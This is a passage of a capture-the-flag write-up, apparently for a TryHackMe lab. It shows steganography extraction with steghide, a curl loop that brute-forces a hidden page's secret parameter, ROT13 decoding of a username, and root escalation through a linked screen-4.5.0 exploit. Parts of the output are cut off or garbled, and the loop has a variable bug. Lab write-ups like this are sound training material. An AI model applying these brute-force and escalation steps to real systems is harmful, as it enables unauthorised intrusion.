then I check the source code for on the defualt page and I found soemthing interessting.
```html
<div class="page_header floating_element">
        <img src="thm.jpg" class="floating_element"/>
<!-- They will never find me-->
        <span class="floating_element">
          Apache2 Ubuntu Default Page
        </span>
      </div>
```
seem like there is something with that thm.jpg. You will notic that the picture is corrupted and you can not view it.I run ```strings``` to check the picture
```console
bibo318@parrot:~/madness$ strings thm.bak 
$3br
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
        #3R
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
#|Ttm
|q6;A
54{Ar
```
I googling about about ```CDEFGHIJSTUVWXYZcdefghijstuvwxyz``` seem like this find have some hidden data inside and we will need use steghide to extract it. To extract the hidden data, we need a password which me dont have. So I decide to work on another stuff


When you open it with hexeditor you will see that thm.jpg file signature is .png. we need to change it back .jpg signature. After some digging if found this [link](https://en.wikipedia.org/wiki/List_of_file_signatures) which contains list of file signatures.



Use hexeditor and fix the signature to ```FF D8 FF E0 00 10 4A 46 49 46 00 01``` and save it now check the picture again and visite the hidden page. here is the source html of the page
```html
<html>
<head>
  <title>Hidden Directory</title>
  <link href="stylesheet.css" rel="stylesheet" type="text/css">
</head>
<body>
  <div class="main">
<h2>Welcome! I have been expecting you!</h2>
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->

<p>Secret Entered: 1</p>

<p>That is wrong! Get outta here!</p>

</div>
</body>
</html>
```
http://10.10.32.231/th1s_1s_h1dd3n/index.php?secret=1

```bash
#!/bin/bash
for i in {1..99}
do
    curl "http://10.10.32.231/th1s_1s_h1dd3n/index.php?secret=$1" 
done > result.txt
```
this script wasn't the best script. but I figured out that each reponse have 18 lines of html. so I ran ```cat result.txt | grep -n wrong ``` and try to find the line that jump more that 18 line.
```console
bibo318@parrot:~/madness$ cat result.txt | grep -n wrong
*
*
1274:<p>That is wrong! Get outta here!</p>
1292:<p>That is wrong! Get outta here!</p>
1310:<p>That is wrong! Get outta here!</p>
1346:<p>That is wrong! Get outta here!</p>
1364:<p>That is wrong! Get outta here!</p>
*
*
```
as you can see between 1310 and 1348, it jump more that 18 so I guess password should be at 1310+18 = line 1328. now let grep that line
```console
bibo318@parrot:~/madness$ cat -n result.txt | grep 1328
  1328  <p>Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B</p>
```
We got the password!!! now use it with steghide to extract the hidden data.
```console
bibo318@parrot:~/madness$ steghide extract -sf thm.jpg 
Enter passphrase: 
wrote extracted data to "hidden.txt".
bibo318@parrot:~/madness$ cat hidden.txt 
Fine you found the password! 

Here's a username 

wbxre

I didn't say I would make it easy for you!
```
The user name look weird and I remember that the hint was ```There's something ROTten about this guys name! ```


ROT is a encryption algorith. The most common ROT is ROT13. I learn how to decrypt ROT13 when I did Bandit CTF, so let crack it
- ROT13
| input                      | output                     |
|----------------------------|----------------------------|
| ABCDEFGHIJKLMNOPQRSTUVWXYZ | NOPQRSTUVWXYZABCDEFGHIJKLM |
| abcdefghijklmnopqrstuvwxyz | nopqrstuvwxyzabcdefghijklm |
```console
bibo318@parrot:~/madness$ echo "wbxre" | tr '[A-Za-z]' '[NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm]'
joker
```
now we got username... still dont have password lol. I dont know where to looks then I found the picture on THM room and try which kinda look suspicious. I try to extract data from the picture using steghide + ```y2RPJ4QaPF!B``` and ```joker``` as password........ it did work. So I was like, let try without password then? GG we got the password
```console
bibo318@parrot:~/madness$ steghide extract -sf 5iW7kC8.jpg
Enter passphrase: 
wrote extracted data to "password.txt".
bibo318@parrot:~/madness$ cat password.txt 
I didn't think you'd find me! Congratulations!

Here take my password

After some researching, I found out that there is sa exploit for ```screen-4.5.0``` link [here](https://www.exploit-db.com/exploits/41154)


crate the ```exploit.sh``` and make it executable (```chmod +x```) and execute it
```console
joker@ubuntu:~$ nano exploit.sh
joker@ubuntu:~$ chmod +x exploit.sh 
joker@ubuntu:~$ ./exploit.sh 
# whoami
root
# cd /root      
# ls

# cat root.txt
